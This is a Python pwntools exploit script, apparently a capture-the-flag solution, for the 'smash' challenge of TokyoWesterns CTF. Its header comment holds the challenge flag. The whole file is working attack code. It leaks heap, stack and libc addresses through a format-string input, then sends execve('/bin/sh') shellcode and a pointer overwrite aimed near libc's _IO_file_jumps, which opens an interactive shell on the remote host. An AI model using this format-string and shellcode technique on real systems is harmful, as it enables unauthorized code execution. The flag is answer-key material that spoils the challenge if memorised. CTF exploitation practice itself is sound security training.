#exploit for smash
#TWCTF{17_15_ju57_4n_3mul470r,n07_r34l_CET}
from pwn import *
import time
elf = ELF("./smash")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
context.binary=elf
target=remote('pwn01.chal.ctf.westerns.tokyo',29246)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

payload="%p\n"*10
sa("Input name > ",payload)
target.recvlines(4)
heap_base=int(target.recvline()[2:],16)-0x6b0
stack_leak=int(target.recvline()[2:],16)
target.recvlines(2)
libc_base=int(target.recvline()[2:],16)-0x270b3
libc_IO_file_jumps = libc_base + 0x1ed4a0
print("heap="+hex(heap_base))
print("stack="+hex(stack_leak))
print("libc="+hex(libc_base))
payload="\xf3\x0f\x1e\xfa" # endbr64
payload+="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload+="\x90"*(0x30-len(payload))
payload+=p64(libc_IO_file_jumps+0x48+8)[:6]
sa("\nOK? [y/n] ",payload)
target.interactive()
